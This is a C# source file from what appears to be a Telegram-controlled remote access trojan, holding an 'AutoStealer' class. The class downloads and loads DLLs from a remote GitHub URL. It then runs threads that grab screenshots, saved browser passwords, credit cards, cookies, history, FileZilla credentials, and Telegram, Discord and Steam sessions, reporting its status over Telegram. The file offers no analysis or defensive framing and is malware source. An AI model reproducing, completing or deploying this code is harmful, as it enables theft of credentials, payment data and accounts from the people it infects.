using System.Collections.Generic;
using System.IO;
using System.Threading;

namespace TelegramRAT;

internal class AutoStealer
{
	public static Thread AutoStealerThread = new Thread(steal);

	private static string lockfile = Path.GetDirectoryName(config.InstallPath) + "\\autosteal.lock";

	public static void loadDlls()
	{
		core.LoadRemoteLibrary("https://raw.githubusercontent.com/attationin/Cloud/main/Sodium.dll");
		core.LoadRemoteLibrary("https://raw.githubusercontent.com/attationin/Cloud/main/libsodium.dll");
		core.LoadRemoteLibrary("https://raw.githubusercontent.com/attationin/Cloud/main/libsodium-64.dll");
	}

	private static void steal()
	{
		if (!config.AutoStealerEnabled || File.Exists(lockfile))
		{
			return;
		}
		File.Create(lockfile);
		List<Thread> list = new List<Thread>
		{
			new Thread(utils.desktopScreenshot),
			new Thread(Passwords.get),
			new Thread(CreditCards.get),
			new Thread(History.get),
			new Thread(Bookmarks.get),
			new Thread(Cookies.get),
			new Thread(FileZilla.get),
			new Thread(TelegramGrabber.get),
			new Thread(DiscordGrabber.get),
			new Thread(SteamGrabber.get),
			new Thread(GrabDesktop.get)
		};
		telegram.sendText("\ud83c\udf39 Starting autostealer...");
		foreach (Thread item in list)
		{
			item.Start();
		}
		Thread.Sleep(20000);
		telegram.sendText("\ud83e\udd40 Stopping autostealer...");
		foreach (Thread item2 in list)
		{
			if (item2.IsAlive)
			{
				try
				{
					item2.Abort();
				}
				catch
				{
				}
			}
		}
	}
}
